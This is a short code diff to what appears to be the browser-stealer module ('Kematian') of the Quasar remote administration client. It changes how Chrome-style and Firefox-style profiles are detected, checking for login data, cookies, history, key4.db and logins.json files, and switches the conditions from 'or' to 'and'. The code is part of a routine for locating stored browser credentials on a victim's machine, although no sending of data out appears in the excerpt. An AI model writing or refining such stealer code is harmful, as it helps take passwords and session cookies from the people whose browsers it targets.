@@ -129,10 +129,10 @@ namespace Quasar.Client.Kematian.Browsers.Helpers
             };
 
             // Check if at least one essential file exists
-            if (File.Exists(profile.WebData) ||
-                File.Exists(profile.Cookies) ||
-                File.Exists(profile.History) ||
-                File.Exists(profile.LoginData) ||
+            if (File.Exists(profile.WebData) &&
+                File.Exists(profile.Cookies) &&
+                File.Exists(profile.History) &&
+                File.Exists(profile.LoginData) &&
                 File.Exists(profile.Bookmarks))
             {
                 if (!profileDir.Contains("Application Data"))
@@ -247,9 +247,9 @@ namespace Quasar.Client.Kematian.Browsers.Helpers
                     History = Path.Combine(basePath, "places.sqlite")
                 };
 
-                if (File.Exists(profile.Key4DB) ||
-                    File.Exists(profile.LoginsJson) ||
-                    File.Exists(profile.Cookies) ||
+                if (File.Exists(profile.Key4DB) &&
+                    File.Exists(profile.LoginsJson) &&
+                    File.Exists(profile.Cookies) &&
                     File.Exists(profile.History))
                 {
                     profiles.Add(profile);
